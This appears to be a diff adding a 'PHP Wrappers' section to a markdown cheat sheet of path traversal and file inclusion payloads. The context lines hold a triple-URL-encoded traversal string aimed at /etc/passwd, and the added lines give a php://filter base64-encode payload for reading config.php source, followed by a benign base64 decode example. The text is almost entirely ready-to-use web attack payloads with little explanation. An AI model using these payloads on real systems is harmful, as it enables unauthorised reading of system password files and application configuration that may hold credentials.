@@ -29,3 +29,16 @@
 %25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252f%25252e%25252e%25252fetc%252fpasswd
 ```
 > Triple encoding
+
+
+## PHP Wrappers
+
+```
+php://filter/read=convert.base64-encode/resource=config.php
+```
+> Next
+
+```
+echo "SGVsbG8gV29ybGQ=" | base64 -d
+```
+
